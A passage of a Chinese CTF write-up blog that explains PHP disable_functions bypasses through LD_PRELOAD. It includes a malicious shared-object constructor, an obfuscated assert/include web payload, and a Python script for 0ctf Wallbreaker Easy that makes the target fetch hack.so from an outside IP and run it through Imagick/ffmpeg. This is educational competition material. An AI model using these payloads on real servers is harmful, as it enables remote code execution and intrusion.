</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__attribute__</span> ((__constructor__)) <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">angel</span> (<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unsetenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/readflag &gt; /tmp/ch3n9w&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>编译</p>
<pre tabindex="0"><code>gcc -shared -fPIC hack.c -o hack.so
</code></pre><p>拖上去就行了</p>
<p>ch3n9w.php</p>
<pre tabindex="0"><code>&lt;?php

    putenv(&#34;LD_PRELOAD=/tmp/hack.so&#34;);
    mail(&#34;&#34;, &#34;&#34;, &#34;&#34;, &#34;&#34;);
?&gt;
</code></pre><p>最后包含代码去执行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#ae81ff">268</span><span style="color:#a6e22e">a054e</span><span style="color:#f92672">-</span><span style="color:#ae81ff">42e7</span><span style="color:#f92672">-</span><span style="color:#ae81ff">45</span><span style="color:#a6e22e">d6</span><span style="color:#f92672">-</span><span style="color:#a6e22e">a8ba</span><span style="color:#f92672">-</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">f3e67a00d0a</span><span style="color:#f92672">.</span><span style="color:#a6e22e">node3</span><span style="color:#f92672">.</span><span style="color:#a6e22e">buuoj</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span><span style="color:#f92672">/?</span><span style="color:#a6e22e">code</span><span style="color:#f92672">=</span>$_<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;`{{{&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;?&lt;&gt;/&#34;</span>;${$_}[<span style="color:#a6e22e">_</span>](${$_}[<span style="color:#a6e22e">__</span>]);<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">_</span><span style="color:#f92672">=</span><span style="color:#a6e22e">assert</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">__</span><span style="color:#f92672">=</span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;/tmp/ch3n9w.php&#34;</span>)
</span></span></code></pre></div><p><code>mail</code>函数产生进程的同时就会触发preload中的代码, 然后读输出中的flag就行了</p>
<h1 id="0ctf-wallbreaker-easy">0ctf Wallbreaker Easy<a hidden class="anchor" aria-hidden="true" href="#0ctf-wallbreaker-easy">#</a></h1>
<p>这道题目参考了小西师傅、一叶飘零和郭dalao学长的分享,真实地感觉自己的菜了。。。</p>
<p>在写脚本的过程中遇见了很多诡异的问题，先留着琢磨。</p>
<h2 id="主要思路">主要思路<a hidden class="anchor" aria-hidden="true" href="#主要思路">#</a></h2>
<p>利用<code>Imagick()</code>中会触发<code>php解释器向外开启系统进程</code>的方法，这里的思路是当传入<code>MPEG</code>格式类型的文件时候，为了转换格式会向外部环境请求并触发<code>ffmpeg</code>的调用，从而开启新的进程。在开启时，环境变量<code>LD_PRELOAD</code>会首先加载，而我们事先会将我们的<code>恶意共享文件hack.so在这个环境变量中指出来</code>，即<code>LD_PRELOAD={DIR}/hack.so</code>。hack.so共享文件由hack.c文件编译，其中调用了<code>__attribute__((constructor))</code>，该方法会在共享文件被加载的时候率先被执行，至于执行的代码，当然就是<code>/readflag &gt; {dir}/flag</code>啦。主要代码如下，代码写法借鉴了郭大佬的脚本，虽然思路不一样，个人感觉dalao的思路更加直接明了。</p>
<p>脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://111.186.63.208:31340/&#34;</span>
</span></span><span style="display:flex;"><span>dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/ef757c06e983a137384378f47607abfa&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#the first time i do this ,i use format function &#39;format&#39; to replace $dir but failed,then i used $dir and &#39;%&#39;,worked ,after the flag went out ,the format problem seems to dispeare?</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#the new Imagick(&#39;{filename}&#39;) beginning with no work,but didnot after replace&#39;&#39;&#39;to &#39;&#34;&#39;,also disapeared after sovled it</span>
</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;pre&gt;hello???????&lt;br&gt;&lt;?php echo &#39;hello&#39;;?&gt;&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$dir = &#34;</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">file_put_contents(&#34;</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">/hack.so&#34;,file_get_contents(&#34;http://207.148.64.125:80/hack.so&#34;));
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">chmod(&#34;</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">/hack.so&#34;,0777);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">putenv(&#34;LD_PRELOAD=</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">/hack.so&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">file_put_contents(&#34;</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">/ch3n9w.wmv&#34;,&#34;sssss&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">file_put_contents(&#34;</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">/ch3n9w&#34;,&#34;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$tocken = new Imagick(&#39;</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">/ch3n9w.wmv&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/pre&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(dir)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#why the command line been executed can not be more than 2 in my script?cause the include will cause error</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">file_put_contents(&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/evil&#39;,base64_decode(&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;));
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">include &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/evil&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">%</span>(dir,base64<span style="color:#f92672">.</span>b64encode(cmd),dir)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;backdoor&#39;</span>: payload })<span style="color:#f92672">.</span>content)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print requests<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;backdoor&#39;</span>:<span style="color:#e6db74">&#34;print_r(scandir(&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;));&#34;</span><span style="color:#f92672">%</span>dir})<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>print requests<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;backdoor&#39;</span>:<span style="color:#e6db74">&#34;echo file_get_contents(&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/ch3n9w&#39;);&#34;</span><span style="color:#f92672">%</span>dir})<span style="color:#f92672">.</span>content
</span></span></code></pre></div><p>脚本写得很烂，注释部分可以忽略，是我在写的过程中遇到的小问题。</p>
<p>然后服务器上面的<code>hack.c</code>文件如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">__attribute__</span> ((__constructor__)) <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">angel</span> (<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/readflag &gt; /tmp/ch3n9w&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>使用命令<code>gcc --share -fPIC hack.c -o hack.so</code>命令来编译共享文件。在服务器目录下面开启<code>python -m SimpleHTTPServer 80</code>，并运行上述python脚本，即可看到flag。</p>
<p><img loading="lazy" src="image-20211114141817095.png" alt="image-20211114141817095"  />
</p>
<blockquote>
<p>ps:每个人的目录会不定时被服务器清空</p>
</blockquote>
<blockquote>
<p>如果LD_PRELOAD不行可以考虑上通杀马</p>
<p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p>
</blockquote>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://ch3n9w.cpolar.cn/posts/sec-java-web/">
    <span class="title">« Prev</span>
    <br>
    <span>java_web题目复现记录</span>
  </a>
  <a class="next" href="https://ch3n9w.cpolar.cn/posts/ctf-qwb-copperstudy-record/">
    <span class="title">Next »</span>
    <br>
    <span>copperstudy-record</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="https://ch3n9w.cpolar.cn/">ch3n9w の 超元域</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
